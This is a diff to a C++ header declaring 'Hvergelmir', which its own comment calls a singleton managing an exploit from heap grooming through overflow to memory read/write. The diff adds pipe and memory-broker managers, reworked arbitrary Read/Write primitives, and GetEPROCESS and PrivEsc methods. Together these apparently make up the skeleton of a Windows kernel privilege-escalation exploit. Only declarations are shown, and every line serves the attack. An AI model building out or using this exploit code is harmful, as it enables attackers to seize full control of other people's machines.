@@ -6,18 +6,21 @@
 
 #include "threadNameManager.h"
 #include "ioRingManager.h"
-
+#include "memoryBroker.h"
+#include "pipeManager.h"
 
 
 class Hvergelmir // Singleton Class to manage the entire exploit process, from heap grooming to triggering the overflow and reading/writing memory
 {
 private:
-
-
 	bool systemVerified = false;
 
-	ThreadNameManager nameManager;
-	IORingManager ioRingManager;
+    MemoryBroker memoryBroker;
+
+	// Managers are owned by the singleton and also registered with MemoryBroker
+	std::shared_ptr<ThreadNameManager> nameManagerPtr;
+	std::shared_ptr<IORingManager> ioRingManagerPtr;
+	std::shared_ptr<PipeManager> pipeManagerPtr;
 
 	Hvergelmir(const Hvergelmir&) = delete;
 	Hvergelmir& operator=(const Hvergelmir&) = delete;
@@ -44,15 +47,13 @@ public:
 	bool VerifySystem();
 	bool Exploit();
 
-	bool Read(BYTE* targetAddress, UINT64 sourceAddress, UINT64 size);
-	bool Write(UINT64 targetAddress, BYTE* sourceAddress, UINT64 size);
+	void Read(UINT64* iDestinationAddr, UINT64 iTargetAddr, UINT64 iSize);
+	void Write(BYTE* iDestinationAddr, UINT64 data, UINT64 size);
+
+	UINT64 GetEPROCESS();
+	bool PrivEsc();
 
 	bool Cleanup();
-
-	// Forwarding helpers for ThreadNameManager used by MemoryBroker
-	bool GetDataLeak(UINT64 a, UINT64 b, UINT64 c) { return nameManager.GetDataLeak(a,b,c); }
-	BYTE* LeakData() { return nameManager.LeakData(); }
-	UINT64 GetLeakSize() { return nameManager.leakSize; }
 
 	
 };
